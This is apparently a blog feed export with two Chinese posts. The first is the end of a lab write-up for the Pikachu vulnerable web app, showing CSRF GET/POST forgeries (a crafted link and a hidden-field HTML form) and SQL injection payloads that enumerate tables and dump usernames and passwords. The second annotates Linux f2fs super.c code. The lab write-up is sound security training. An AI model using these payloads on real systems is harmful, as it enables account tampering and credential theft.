class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8081/pikachu/vul/csrf/csrfget/csrf_get_login.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=if4hcn3lljacuqfjpg55llim4g</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
<ul>
<li>登陆后信息</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210611104359920.png" alt="image-20210611104359920" style="zoom:80%;"></p>
<ul>
<li>修改个人信息并抓包（修改手机号为 123）</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=&amp;phonenum=123&amp;add=&amp;email=&amp;submit=submit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8081/pikachu/vul/csrf/csrfget/csrf_get_edit.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=if4hcn3lljacuqfjpg55llim4g</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
<ul>
<li>这时，只要 lili 不退出登录，且点击链接</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8081/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=0000&amp;add=wakanda&amp;email=hh@hh.com&amp;submit=submit</span><br></pre></td></tr></table></figure>
<p>就可以成功修改信息</p>
<p><img src="/2021/06/07/pikachuRecord/image-20210611104932283.png" alt="image-20210611104932283" style="zoom:80%;"></p>
<h3 id="3-2-CSRF-post-login"><a href="#3-2-CSRF-post-login" class="headerlink" title="3.2 CSRF(post) login"></a>3.2 CSRF(post) login</h3><p><a href="https://blog.csdn.net/weixin_44940180/article/details/107140456">参考</a></p>
<ul>
<li>登录 lili/123456，修改地址并抓包</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pikachu/vul/csrf/csrfpost/csrf_post_edit.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>46</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:8081</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8081/pikachu/vul/csrf/csrfpost/csrf_post_edit.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=if4hcn3lljacuqfjpg55llim4g</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="dts">sex=<span class="variable">&amp;phonenum</span>=<span class="variable">&amp;add</span>=whitep<span class="variable">&amp;email</span>=<span class="variable">&amp;submit</span>=submit</span></span><br></pre></td></tr></table></figure>
<ul>
<li>构造表单提交 POST 请求。参考 <a href="https://blog.csdn.net/weixin_44940180/article/details/107140456">https://blog.csdn.net/weixin_44940180/article/details/107140456</a> </li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8081/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">       	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>将此 HTML 文件放到 <code>..\xampp\htdocs</code> 目录，在不退出 lili 账户的情况下，访问 <code>http://localhost:8081/csrf_post.html</code> </li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210611113033794.png" alt="image-20210611113033794" style="zoom:80%;"></p>
<ul>
<li>点击按钮，信息被成功修改</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210611113054183.png" alt="image-20210611113054183" style="zoom:80%;"></p>
<h3 id="3-3-CSRF-Token-login"><a href="#3-3-CSRF-Token-login" class="headerlink" title="3.3 CSRF Token login"></a>3.3 CSRF Token login</h3><ul>
<li>首先登录 lili/123456，然后修改个人信息，用 BP 截获</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210615225321492.png" alt="image-20210615225321492" style="zoom:80%;"></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=0&amp;phonenum=0&amp;add=0&amp;email=0&amp;token=7161660c8beacb171d715542422&amp;submit=submit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8081/pikachu/vul/csrf/csrftoken/token_get_edit.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lfobrlou9i3bel3q9bbsbkvmd9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
<ul>
<li>这里与上文 CSRF(get) login 区别在于，这里是带 token 的，由于 token 是随机的，所以这里我们无法和上文一样构造 URL 让用户点击完成信息修改了。</li>
</ul>
<h2 id="4-SQL-注入"><a href="#4-SQL-注入" class="headerlink" title="4 SQL 注入"></a>4 SQL 注入</h2><h3 id="先验知识-3"><a href="#先验知识-3" class="headerlink" title="先验知识"></a>先验知识</h3><h4 id="形成的原因"><a href="#形成的原因" class="headerlink" title="形成的原因"></a>形成的原因</h4><p>前端数据传到后台处理时，未做严格过滤，导致传入的数据拼接到 SQL 语句后，被执行</p>
<h4 id="常见注入方法"><a href="#常见注入方法" class="headerlink" title="常见注入方法"></a>常见注入方法</h4><ul>
<li>UNION 注入<ul>
<li>方法：使用 UNION 语句把数据展示到页面</li>
</ul>
</li>
<li>报错注入<ul>
<li>方法：利用 MySQL 执行后的报错信息</li>
</ul>
</li>
<li>布尔盲注<ul>
<li>方法：看不到直接的数据，但是可以通过注入，看页面是否有变化来推测出数据。</li>
<li>案例：比如在参数后添加类似 <code>and 1=1</code> 这种，如果页面正常返回，说明 <code>and</code> 是成功执行的，那这个参数就存在 SQL 注入漏洞</li>
</ul>
</li>
<li>时间盲注<ul>
<li>方法：通过 sleep() 函数，利用 IF 函数或 AND OR 的短路特性和执行时间判断 SQL 攻击的结果</li>
<li>案例：<code>id=&#39;1&#39; or sleep(1);</code></li>
</ul>
</li>
</ul>
<h4 id="如何避免-1"><a href="#如何避免-1" class="headerlink" title="如何避免"></a>如何避免</h4><ul>
<li>使用预编译语句，绑定变量</li>
<li>检查数据类型（比如邮箱，日期等按严格的格式输入）</li>
<li>使用安全的编码函数（比如 OWASP ESAPI 中实现的encodeForSQL）</li>
</ul>
<h3 id="4-1-数字型注入"><a href="#4-1-数字型注入" class="headerlink" title="4.1 数字型注入"></a>4.1 数字型注入</h3><ul>
<li>选择任一数字，点击查询，发现 URL 并未出现对应的参数，所以应该是通过 POST 传参</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210615230701375.png" alt="image-20210615230701375" style="zoom:80%;"></p>
<ul>
<li>用 BurpSuite 截获数据包</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pikachu/vul/sqli/sqli_id.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:8081</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8081/pikachu/vul/sqli/sqli_id.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=94ocsnqcobv4btt7s7mv638b7i</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">id</span>=<span class="number">1</span>&amp;submit=%E<span class="number">6</span>%<span class="number">9</span>F%A<span class="number">5</span>%E<span class="number">8</span>%AF%A<span class="number">2</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>CTRL + R</code> 发送到 Repeater 发送，得到响应</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210615230926001.png" alt="image-20210615230926001"></p>
<ul>
<li>改参数 <code>id=2</code> 重发一次，结果为</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210615231018613.png" alt="image-20210615231018613"></p>
<ul>
<li><code>id=2-1</code> 重发，结果为</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210615231344694.png" alt="image-20210615231344694"></p>
<ul>
<li>所以，是进行数值运算的，因此存在数字型注入</li>
<li>通过联合查询，查询数据库所有表名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210615231929918.png" alt="image-20210615231929918"></p>
<ul>
<li>查询 <code>users</code> 对应字段名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210615232221004.png" alt="image-20210615232221004"></p>
<h3 id="4-2-字符型注入"><a href="#4-2-字符型注入" class="headerlink" title="4.2 字符型注入"></a>4.2 字符型注入</h3><p><img src="/2021/06/07/pikachuRecord/image-20210627202218102.png" alt="image-20210627202218102"></p>
<ul>
<li>输入 <code>1&#39;</code> 报错</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
<ul>
<li>猜测查询语句为</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM 表名 WHERE username=&#x27;输入的用户名&#x27;;</span><br></pre></td></tr></table></figure>
<ul>
<li>所以需要先闭合前面的单引号，然后注释后面的单引号，输入以下内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627202628179.png" alt="image-20210627202628179"></p>
<p><a href="https://blog.csdn.net/weixin_41607190/article/details/82818804">原理参考</a></p>
<hr>
<h4 id="关于-or-1-1-的解释"><a href="#关于-or-1-1-的解释" class="headerlink" title="关于 or 1=1 的解释"></a>关于 <code>or 1=1</code> 的解释</h4><ul>
<li>如上述输入后，原本的查询语句就会变成</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM 表名 WHERE username=&#x27;1&#x27; or 1=1#&#x27;;</span><br></pre></td></tr></table></figure>
<ul>
<li>这条语句条件判断会被后面的 <code>or 1=1</code> 影响，因为一直为真，所以任意 username 都会被查询    </li>
</ul>
<hr>
<h3 id="4-3-搜索型注入"><a href="#4-3-搜索型注入" class="headerlink" title="4.3 搜索型注入"></a>4.3 搜索型注入</h3><ul>
<li>只要输入用户名的一部分，就可以找到该用户并输出其信息</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210627203853344.png" alt="image-20210627203853344" style="zoom:80%;"></p>
<ul>
<li>所以可以想到 MYSQL 中 <a href="https://www.yuque.com/victorinfo/mysqlnote/ch08">用通配符过滤</a> ，也即使用 <code>%</code> 来表示任意字符出现任意次数，所以查询语句的后半段大致应该是 <code>username = &#39;%用户名的部分字符%&#39;</code> </li>
<li>因此，与上一例子同理，可以先输入任意字符然后闭合前面的单引号，并注释后面的单引号</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627204356615.png" alt="image-20210627204356615" style="zoom:80%;"></p>
<h3 id="4-4-xx型注入"><a href="#4-4-xx型注入" class="headerlink" title="4.4 xx型注入"></a>4.4 xx型注入</h3><ul>
<li>看一下源码 <code>\xampp\htdocs\pikachu\vul\sqli</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里没有做任何处理，直接拼到select里面去了</span></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="comment">//这里的变量是字符型，需要考虑闭合</span></span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=(&#x27;<span class="subst">$name</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>所以需要闭合前面的小括号</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) or 1=1#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627205214188.png" alt="image-20210627205214188" style="zoom:80%;"></p>
<h3 id="拓展1-联合查询"><a href="#拓展1-联合查询" class="headerlink" title="拓展1 联合查询"></a>拓展1 联合查询</h3><p><a href="https://www.bilibili.com/video/BV1Y7411f7ic?p=26&amp;spm_id_from=pageDriver">参考</a></p>
<h4 id="UNION"><a href="#UNION" class="headerlink" title="UNION"></a>UNION</h4><h5 id="如何查询字段数？"><a href="#如何查询字段数？" class="headerlink" title="如何查询字段数？"></a>如何查询字段数？</h5><ul>
<li>利用 <code>order by 1</code> 测试，以字符型注入为例，可以输入</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2#</span><br></pre></td></tr></table></figure>
<p>返回结果均为</p>
<p><img src="/2021/06/07/pikachuRecord/image-20210627210220009.png" alt="image-20210627210220009" style="zoom:80%;"></p>
<ul>
<li>当输入</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3#</span><br></pre></td></tr></table></figure>
<p>报错</p>
<p><img src="/2021/06/07/pikachuRecord/image-20210627210307201.png" alt="image-20210627210307201"></p>
<ul>
<li><p>因此可以确定有两个字段</p>
</li>
<li><p>可以通过 UNION 查询，获取数据库名 <code>database()</code>，版本 <code>version()</code> ，用户 <code>user()</code> 。当然如果只需要查询其中某个信息，可以用任意数值代替其他字段，如</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select database(),2#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627210627812.png" alt="image-20210627210627812" style="zoom:80%;"></p>
<h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><h5 id="a-获取表名-table-schema"><a href="#a-获取表名-table-schema" class="headerlink" title="a. 获取表名 table_schema"></a>a. 获取表名 table_schema</h5><ul>
<li>根据上文，我们已经可以知道数据库名称为 pikachu ，可以构造查询语句，查询 table_schema</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union select 1,table_name from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627212118693.png" alt="image-20210627212118693" style="zoom:80%;"></p>
<h5 id="b-获取字段名-table-name"><a href="#b-获取字段名-table-name" class="headerlink" title="b. 获取字段名 table_name"></a>b. 获取字段名 table_name</h5><ul>
<li>由上文可知，有一个表为 user，所以里面极可能存放用户名及密码等重要信息</li>
<li>同理可以构造查询语句，查询表 users 中的字段</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627212426636.png" alt="image-20210627212426636" style="zoom:80%;"></p>
<h5 id="c-获取内容"><a href="#c-获取内容" class="headerlink" title="c. 获取内容"></a>c. 获取内容</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select username,password from users#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627212713423.png" alt="image-20210627212713423" style="zoom:80%;"></p>
<h3 id="拓展2-报错"><a href="#拓展2-报错" class="headerlink" title="拓展2 报错"></a>拓展2 报错</h3><p><a href="https://www.bilibili.com/video/BV1Y7411f7ic?p=28">p28</a></p>
]]></content>
      <categories>
        <category>SEC</category>
      </categories>
      <tags>
        <tag>pikachu</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>linux_f2fs_super_cp_recv</title>
    <url>/2020/02/29/linux-f2fs-super-cp-recv/</url>
    <content><![CDATA[<h1 id="Linux-v3-8-rc1"><a href="#Linux-v3-8-rc1" class="headerlink" title="Linux v3.8-rc1"></a>Linux v3.8-rc1</h1><h2 id="super-c"><a href="#super-c" class="headerlink" title="super.c"></a>super.c</h2><h3 id="f2fs-alloc-inode-从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs-inode"><a href="#f2fs-alloc-inode-从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs-inode" class="headerlink" title="f2fs_alloc_inode // 从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs_inode"></a>f2fs_alloc_inode // 从缓存中申请内存后，初始化具体的inode信息并设定标志，返回vfs_inode</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* struct inode 和 struct super_block 在/include/linux/fs.h中*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct inode *<span class="title">f2fs_alloc_inode</span><span class="params">(struct super_block *sb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_inode_info</span> *<span class="title">fi</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用kmem_cache_alloc从缓存中申请内存。</span></span><br><span class="line"><span class="comment">     * f2fs_inode_cachep是可以指向任意kmem_cache类型的结构体指针</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 内存分配掩码Get Free Page Mask</span></span><br><span class="line"><span class="comment">     * GFP_NOFS：分配内存时，禁止任何文件系统操作</span></span><br><span class="line"><span class="comment">     * __GFP_ZERO：分配器在分配成功时，将返回填充字节0的页</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    fi = kmem_cache_alloc(f2fs_inode_cachep, GFP_NOFS | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">if</span> (!fi)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    init_once((<span class="keyword">void</span> *) fi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initilize f2fs-specific inode info */</span></span><br><span class="line">    fi-&gt;vfs_inode.i_version = <span class="number">1</span>;</span><br><span class="line">    atomic_set(&amp;fi-&gt;dirty_dents, <span class="number">0</span>);</span><br><span class="line">    fi-&gt;current_depth = <span class="number">1</span>;</span><br><span class="line">    fi-&gt;is_cold = <span class="number">0</span>;</span><br><span class="line">    rwlock_init(&amp;fi-&gt;ext.ext_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设定索引节点的标志（FI_NEW_INODE为枚举类型，表明新分配的索引节点）</span></span><br><span class="line">    set_inode_flag(fi, FI_NEW_INODE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &amp;fi-&gt;vfs_inode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="f2fs-i-callback-进程结束后把进程信息存放到缓存中"><a href="#f2fs-i-callback-进程结束后把进程信息存放到缓存中" class="headerlink" title="f2fs_i_callback // 进程结束后把进程信息存放到缓存中"></a>f2fs_i_callback // 进程结束后把进程信息存放到缓存中</h3><p>调用<code>container_of</code>(macro在include/linux/kernel.h中)使指针head指向inode结构体的成员变量i_rcu, 把整个inode结构体的指针都存放在<code>struct inode *inode</code>，再调用<code>F2FS_I</code>函数通过inode指针指向f2fs_inode_info中的成员vfs_inode，通过inode指针返回结构体f2fs_inode_info的起始地址。然后调用<code>kmem_cache_free</code>函数把前面返回的结构体地址保存到f2fs_inode_cachep。</p>
<h3 id="f2fs-destroy-inode-销毁旧的inode指针"><a href="#f2fs-destroy-inode-销毁旧的inode指针" class="headerlink" title="f2fs_destroy_inode // 销毁旧的inode指针"></a>f2fs_destroy_inode // 销毁旧的inode指针</h3><h3 id="f2fs-put-super-释放内存"><a href="#f2fs-put-super-释放内存" class="headerlink" title="f2fs_put_super // 释放内存"></a>f2fs_put_super // 释放内存</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f2fs_put_super</span><span class="params">(struct super_block *sb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * F2FS_SB in /fs/f2fs/f2fs.h</span></span><br><span class="line"><span class="comment">     * 把sb指向结构体super_block的子数据s_fs_info指针并将其赋给sbi</span></span><br><span class="line"><span class="comment">     * s_fs_info指向特定文件系统的超级块信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_sb_info</span> *<span class="title">sbi</span> =</span> F2FS_SB(sb);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_F2FS_STAT_FS <span class="comment">// 如果宏已经定义，则编译下面代码</span></span></span><br><span class="line">    <span class="keyword">if</span> (sbi-&gt;s_proc) &#123;</span><br><span class="line">        f2fs_stat_exit(sbi);</span><br><span class="line">        remove_proc_entry(sb-&gt;s_id, f2fs_proc_root);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    stop_gc_thread(sbi); <span class="comment">// 停止gc线程</span></span><br><span class="line"></span><br><span class="line">    write_checkpoint(sbi, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    iput(sbi-&gt;node_inode); <span class="comment">// 如果索引节点使用计数达到零，则索引节点将被释放或销毁</span></span><br><span class="line">    iput(sbi-&gt;meta_inode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* destroy f2fs internal modules */</span></span><br><span class="line">    destroy_gc_manager(sbi);</span><br><span class="line">    destroy_node_manager(sbi);</span><br><span class="line">    destroy_segment_manager(sbi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kfree释放先前分配的内存</span></span><br><span class="line"><span class="comment">     * sbi-&gt;ckpt：kmalloc返回的指针。 如果sbi-&gt;ckpt为NULL，则不执行任何操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    kfree(sbi-&gt;ckpt);</span><br><span class="line"></span><br><span class="line">    sb-&gt;s_fs_info = <span class="literal">NULL</span>;</span><br><span class="line">    brelse(sbi-&gt;raw_super_buf);</span><br><span class="line">    kfree(sbi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="f2fs-statfs-获取f2fs使用情况"><a href="#f2fs-statfs-获取f2fs使用情况" class="headerlink" title="f2fs_statfs // 获取f2fs使用情况"></a>f2fs_statfs // 获取f2fs使用情况</h3><p>如block大小和数目。可使用的有效block数目，有效的inode数目，有效的node数目</p>
<h3 id="f2fs-show-options-属性显示"><a href="#f2fs-show-options-属性显示" class="headerlink" title="f2fs_show_options // 属性显示"></a>f2fs_show_options // 属性显示</h3><p>如有操作，如“后台清理”、“关闭前滚”、“无堆分配”等情况出现，向seq流中写入相应的字符串如”,background_gc_on”</p>
